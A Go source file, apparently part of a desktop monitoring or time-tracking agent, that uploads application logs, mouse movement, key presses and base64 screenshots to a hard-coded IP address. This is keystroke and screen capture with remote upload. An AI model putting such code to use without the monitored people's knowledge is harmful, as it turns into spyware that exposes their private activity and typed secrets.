package main

import (
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"strings"
)

var basURL string = "http://180.149.241.208:3039/api/v1/manage/"

func sendLogs() {
	appLogs := getLogs()
	if len(appLogs) != 0 {
		request := &logRequest{
			AppLogs: appLogs, Mouse: mouseMovement, Keyboard: keyPress,
		}

		jsonData, _ := json.Marshal(request)
		url := basURL + "logs/add-log-data"

		encryptedPayload := &encryptedLogRequest{
			Data: keyEncrypt(encryptionKey, string(jsonData)),
		}

		jsonDataPayload, _ := json.Marshal(encryptedPayload)

		payload := strings.NewReader(string(jsonDataPayload))
		apiCall(url, "POST", payload)

		fmt.Printf("\n Send Log API called \n")
	}

}

func sendScreenShot(base64Image string) {
	appLogs := getLogs()
	if len(appLogs) != 0 {
		request := &imageRequest{
			Base64Image: base64Image,
		}
		jsonData, _ := json.Marshal(request)
		url := basURL + "image-logs"

		payload := strings.NewReader(string(jsonData))
		apiCall(url, "POST", payload)
	}

}

func apiCall(url string, method string, payload io.Reader) {

	client := &http.Client{}
	req, err := http.NewRequest(method, url, payload)
	if err != nil {
		fmt.Println(err)
	}
	req.Header.Add("Content-Type", "application/json")
	req.Header.Add("Authorization", token)

	res, err := client.Do(req)
	if err != nil {
		fmt.Println("API fail")
	}
	defer res.Body.Close()
	_, err = ioutil.ReadAll(res.Body)

	// fmt.Println(string(body))
}
